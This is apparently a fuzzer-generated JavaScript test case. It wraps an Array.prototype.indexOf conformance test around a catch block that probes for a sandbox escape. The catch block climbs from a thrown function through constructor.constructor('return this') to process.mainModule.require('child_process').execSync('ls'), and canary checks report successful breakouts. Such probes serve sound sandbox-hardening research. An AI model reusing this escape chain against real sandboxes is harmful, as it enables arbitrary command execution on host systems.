try {
    Object.defineProperty(Array.prototype, '0', {
        get: function () {
            let REPLACER = 23;
            return 10;
        },
        configurable: true
    });
    Object.defineProperty(Array.prototype, '1', {
        get: function () {
            throw () => {
                return () => {
                };
            };
            return 20;
        },
        configurable: true
    });
    Object.defineProperty(Array.prototype, '2', {
        get: function () {
            return 30;
        },
        configurable: true
    });
    assert.sameValue([
        ,
        ,
        ,
    ].indexOf(10), 0, '[, , , ].indexOf(10)');
    assert.sameValue([
        ,
        ,
        ,
    ].indexOf(20), 1, '[, , , ].indexOf(20)');
    assert.sameValue([
        ,
        ,
        ,
    ].indexOf(30), 2, '[, , , ].indexOf(30)');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}